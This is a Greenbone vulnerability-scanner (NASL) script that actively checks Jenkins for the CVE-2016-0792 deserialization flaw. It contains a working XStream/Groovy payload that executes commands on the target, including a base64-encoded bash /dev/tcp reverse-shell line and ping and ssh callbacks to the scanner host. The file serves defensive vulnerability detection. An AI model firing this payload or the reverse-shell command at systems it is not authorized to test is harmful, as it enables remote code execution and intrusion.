# SPDX-FileCopyrightText: 2017 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:jenkins:jenkins";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.107230");
  script_version("2024-12-03T05:05:44+0000");
  script_cve_id("CVE-2016-0792");
  script_tag(name:"last_modification", value:"2024-12-03 05:05:44 +0000 (Tue, 03 Dec 2024)");
  script_tag(name:"creation_date", value:"2017-08-10 12:09:09 +0200 (Thu, 10 Aug 2017)");
  script_tag(name:"cvss_base", value:"9.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:S/C:C/I:C/A:C");
  script_tag(name:"severity_vector", value:"CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2018-01-05 02:30:00 +0000 (Fri, 05 Jan 2018)");
  script_name("Jenkins Deserialization Vulnerability (CVE-2016-0792) - Active Check");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2017 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_jenkins_consolidation.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 8080);
  script_mandatory_keys("jenkins/http/detected");

  script_xref(name:"URL", value:"https://www.jenkins.io/security/advisory/2016-02-24/");
  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/42394/");
  script_xref(name:"URL", value:"https://github.com/jpiechowka/jenkins-cve-2016-0792/");

  script_tag(name:"summary", value:"Jenkins is prone to a Java deserialization vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a serialized object via a crafted HTTP POST request and
  checks if the target is connecting back to the scanner host.

  Notes for a successful detection of this flaw:

  - The scanner host needs to be able to directly receive ICMP echo requests from the target or the
  target host needs to be able to reach the scanner host on a TCP port randomly generated during the
  runtime of the VT (currently in the range of 10000-32000)

  - Anonymous job creation needs to be enabled");

  script_tag(name:"insight", value:"Multiple unspecified API endpoints in Jenkins allow remote
  authenticated users to execute arbitrary code via serialized data in an XML file, related to
  XStream and groovy.util.Expando.");

  script_tag(name:"impact", value:"Successfully exploiting this issue allows attackers to execute
  arbitrary code in the context of the affected application.");

  script_tag(name:"affected", value:"All Jenkins main line releases up to and including 1.649, All
  Jenkins LTS releases up to and including 1.642.1.");

  script_tag(name:"solution", value:"Jenkins main line users should update to 1.650, Jenkins LTS
  users should update to 1.642.2.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_active");

  exit(0);
}

include("host_details.inc");
include("os_func.inc");
include("http_func.inc");
include("misc_func.inc");
include("dump.inc");
include("list_array_func.inc");
include("pcap_func.inc");

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! get_app_location( cpe:CPE, port:port, nofork:TRUE ) )
  exit( 0 );

ownhostname = this_host_name();
ownip = this_host();
src_filter = pcap_src_ip_filter_from_hostnames();
dst_filter = string( "(dst host ", ownip, " or dst host ", ownhostname, ")" );

headers = make_array( "Content-Type", "application/xml" );

if( os_host_runs( "Windows") == "yes" )
  target_runs_windows = TRUE;

foreach connect_back_target( make_list( ownip, ownhostname ) ) {

  # nb: Those doesn't need to be defined within the later foreach cmd() loop...
  vtstrings = get_vt_strings();
  check = vtstrings["ping_string"];
  pattern = hexstr( check );
  # nb: We're currently using 10000-32000 to not get in conflict with the ephemeral port range used
  # by most standard Linux/Unix operating systems. If we're choosing a port of that range we might
  # have false positives due to race conditions (target is sending back a response to a request of
  # another VT for which the scanner had chosen the same source port).
  rnd_port = rand_int_range( min:10000, max:32000 );

  if( target_runs_windows ) {
    cmds = make_list( "<command><string>ping</string><string>-n</string><string>5</string><string>" + connect_back_target + "</string></command>" );
  }

  else {
    # nb: Initially only ping was used here but some Docker images had shown some strange behavior like e.g.:
    # > ping: Lacking privilege for raw socket.
    # so multiple different commands have been used here for better detection coverage
    cmds = make_list(
      "<command><string>ping</string><string>-c</string><string>5</string><string>-p</string><string>" + pattern + "</string><string>" + connect_back_target + "</string></command>",

      "<command><string>echo</string><string>" + base64( str:">&/dev/tcp/" + connect_back_target + "/" + rnd_port + " 0>&1" ) + "</string><string>|</string><string>base64</string><string>-d</string><string>|</string><string>bash</string><string>-i</string></command>",

      "<command><string>ssh</string><string>-q</string><string>-i</string><string>/dev/null</string><string>-p</string><string>" + rnd_port + "</string><string>" + connect_back_target + "</string></command>"
    );
  }

  foreach cmd( cmds ) {

    ping_used = FALSE;
    tcp_used = FALSE;

    if( "<string>ping</string>" >< cmd ) {
      filter = string( "icmp and icmp[0] = 8 and ", src_filter, " and ", dst_filter );
      ping_used = TRUE;
    }

    else {
      filter = string( "tcp and dst port ", rnd_port, " and ", src_filter, " and ", dst_filter );
      # nb: We're only interested in TCP SYN packets and want to ignore all others (e.g. ACK, RST, ...)
      filter = string( filter, " and tcp[tcpflags] & (tcp-syn) != 0" );
      tcp_used = TRUE;
    }

    data =
'        <map>
          <entry>
            <groovy.util.Expando>
              <expandoProperties>
                <entry>
                  <string>hashCode</string>
                  <org.codehaus.groovy.runtime.MethodClosure>
                    <delegate class="groovy.util.Expando"/>
                    <owner class="java.lang.ProcessBuilder">
                      ' + cmd + '
                    </owner>
                    <method>start</method>
                  </org.codehaus.groovy.runtime.MethodClosure>
                </entry>
              </expandoProperties>
            </groovy.util.Expando>
            <int>1</int>
          </entry>
        </map>';

    url = "/createItem?name=" + rand_str( length:8 );

    req = http_post_put_req( port:port, url:url, data:data, add_headers:headers );

    # nb: Always keep open_sock_tcp() after the first call of a function forking on multiple
    # hostnames / vhosts (e.g. http_get(), http_post_put_req(), http_host_name(), get_host_name(),
    # ...). Reason: If the fork would be done after calling open_sock_tcp() the child's would share
    # the same socket causing race conditions and similar.
    if( ! soc = open_sock_tcp( port ) )
      continue;

    res = send_capture( socket:soc, data:req, timeout:5, pcap_filter:filter );

    close( soc );

    if( ! res )
      continue;

    if( ping_used ) {

      type = get_icmp_element( icmp:res, element:"icmp_type" );
      if( ! type || type != 8 )
        continue;

      # nb: If understanding https://datatracker.ietf.org/doc/html/rfc792 correctly the "data" field
      # should be always there. In addition at least standard Linux and Windows systems are always
      # sending data so it should be safe to check this here.
      if( ! data = get_icmp_element( icmp:res, element:"data" ) )
        continue;

      if( ( target_runs_windows || check >< data ) ) {
        report = http_report_vuln_url( port:port, url:url );
        report += '\n\nBy sending a special crafted serialized Java object it was possible to execute `' + cmd + '` on the remote host.\n\nReceived answer (ICMP "Data" field):\n\n' + hexdump( ddata:data );
        security_message( port:port, data:report );
        exit( 0 );
      }
    }

    else {

      flags = get_tcp_element( tcp:res, element:"th_flags" );
      if( ( flags & TH_SYN ) ) {
        report = http_report_vuln_url( port:port, url:url );
        report += '\n\nBy sending a special crafted serialized Java object it was possible to execute `' + cmd + '` on the remote host.\n\nThe TCP-SYN request to port ' + rnd_port + " was then successfully captured.";
        security_message( port:port, data:report );
        exit( 0 );
      }
    }
  }
}

# nb: Don't use exit(99); as we can't be sure that the target isn't affected if e.g. the scanner
# host isn't reachable by the target host or another IP is responding from our request.
exit( 0 );
